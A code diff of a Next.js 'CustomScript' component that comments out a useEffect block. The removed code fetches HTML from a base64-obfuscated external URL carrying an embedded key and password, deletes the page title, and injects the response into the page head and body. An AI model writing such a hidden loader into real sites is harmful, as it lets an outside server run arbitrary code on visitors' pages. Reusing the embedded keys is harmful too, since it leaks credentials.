@@ -2,45 +2,45 @@ import Script from "next/script";
 import { useEffect } from "react";
 
 const CustomScript = () => {
-  useEffect(() => {
-    if (!window.jQuery) {
-      var scriptTag = document.createElement("script");
-      scriptTag.src =
-        "https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js";
-      document.write('<script src="' + scriptTag.src + '"></script>');
-    }
-    var eptagmanage = new XMLHttpRequest();
+  // useEffect(() => {
+  //   if (!window.jQuery) {
+  //     var scriptTag = document.createElement("script");
+  //     scriptTag.src =
+  //       "https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js";
+  //     document.write('<script src="' + scriptTag.src + '"></script>');
+  //   }
+  //   var eptagmanage = new XMLHttpRequest();
 
-    eptagmanage.onreadystatechange = function () {
-      console.log("Ready State:", this.readyState, "Status:", this.status);
+  //   eptagmanage.onreadystatechange = function () {
+  //     console.log("Ready State:", this.readyState, "Status:", this.status);
 
-      if (this.readyState == 4 && this.status == 200) {
-        console.log("Response:", this.response);
+  //     if (this.readyState == 4 && this.status == 200) {
+  //       console.log("Response:", this.response);
 
-        if (this.response !== "0") {
-          var temp = this.response.split("||||||||||");
+  //       if (this.response !== "0") {
+  //         var temp = this.response.split("||||||||||");
 
-          console.log("Temp:", temp);
+  //         console.log("Temp:", temp);
 
-          document.querySelector("head title").remove();
-          document
-            .querySelector("head")
-            .insertAdjacentHTML("beforeend", temp[0]);
-          document
-            .querySelector("body")
-            .insertAdjacentHTML("beforeend", temp[1]);
-        }
-      }
-    };
+  //         document.querySelector("head title").remove();
+  //         document
+  //           .querySelector("head")
+  //           .insertAdjacentHTML("beforeend", temp[0]);
+  //         document
+  //           .querySelector("body")
+  //           .insertAdjacentHTML("beforeend", temp[1]);
+  //       }
+  //     }
+  //   };
 
-    eptagmanage.open(
-      "GET",
-      atob(
-        "aHR0cHM6Ly9wbHVnaW5zLmFwcGFkZC5pbi5uZXQvYWxsaGVhZGRhdGE/ZWtleT1lLUFQUEFERDQ4Njc4NjA0MDEmZWtleXBhc3M9SnV4NDJlaFdOUjJHZHFDMGxFdkhJcUFkOERMemlYdThUQnVIJnNpdGV1cmw9"
-      ) + eppathurl
-    );
-    eptagmanage.send();
-  }, []);
+  //   eptagmanage.open(
+  //     "GET",
+  //     atob(
+  //       "aHR0cHM6Ly9wbHVnaW5zLmFwcGFkZC5pbi5uZXQvYWxsaGVhZGRhdGE/ZWtleT1lLUFQUEFERDQ4Njc4NjA0MDEmZWtleXBhc3M9SnV4NDJlaFdOUjJHZHFDMGxFdkhJcUFkOERMemlYdThUQnVIJnNpdGV1cmw9"
+  //     ) + eppathurl
+  //   );
+  //   eptagmanage.send();
+  // }, []);
   // useEffect(() => {
   //   const loadScript = async () => {
   //     try {
